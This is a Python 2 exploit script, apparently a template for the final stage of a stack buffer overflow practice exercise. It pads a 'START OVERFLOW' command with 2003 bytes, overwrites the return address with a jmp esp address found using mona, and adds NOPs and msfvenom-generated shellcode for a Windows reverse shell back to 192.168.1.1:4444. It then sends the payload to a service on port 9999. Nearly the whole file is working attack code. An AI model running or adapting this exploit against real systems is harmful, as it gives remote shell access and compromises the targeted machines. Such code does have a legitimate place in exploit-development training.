#!/usr/bin/python 
import socket 
import time 
import sys

#Fifth and final step: Reverse shell (note to update the badchar as appicable)

#change the eip value as the retn address, take the address from mona - 
#1. !mona modules
#2. !mona jmp -r esp -cpb "\x00\x04" (change the badchar as per the previous step)

#generate the reverse shell as per given msfvenom command
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 EXITFUNC=thread -b "\x00\x04" -f py

shellcode =  ""
shellcode += "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += "\x5e\x81\x76\x0e\x1f\xe9\x4c\xbe\x83\xee\xfc"
shellcode += "\xe2\xf4\xe3\x01\xce\xbe\x1f\xe9\x2c\x37\xfa"
shellcode += "\xb1\xc7\xe6\x3b\xe8\x9f\xd8\x94\xe5\x07\x35"
shellcode += "\x47\xf5\x4d\x6d\x94\xed\xc7\xbf\xcf\x60\x08"
shellcode += "\x9a\x3b\xb2\x17\xdf\x46\xb3\x1d\x41\xff\xb6"
shellcode += "\x13\xe4\x94\xfb\xa7\x33\x42\x81\x7f\x8c\x1f"
shellcode += "\xe9\x24\xc9\x6c\xdb\x13\xea\x77\xa5\x3b\x98"
shellcode += "\xe0\xd9\x24\xb6\x98\xf4\x2c\x41\xca\x52\xac"
shellcode += "\xa3\x35\xe3\x24\x18\x8a\x54\xd1\x41\xca\xd5"
shellcode += "\x4a\xc2\x15\x69\xb7\x5e\x6a\xec\xf7\xf9\x0c"
shellcode += "\x9b\x23\xd4\x1f\xba\xb3\x6b"

try:	
	
	filler = "A" * 2003 #change the size
	retn = "\x64\xe4\x34\xfe" #change the retn address
	offset = "BBBB"
	nops = "\x90" * 16 # also known as padding

	buffer = filler + retn + offset + nops + shellcode

	inputBuffer = "START OVERFLOW" + buffer + "\r\n"

	print "Sending evil buffer with %s bytes\n" % len(inputBuffer)

	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

	#change ip and port
	s.connect(("192.168.1.10", 9999))
	s.send(inputBuffer)
	s.close()
	print "Done!"

except:
	print "Could not connect!"
	sys.exit()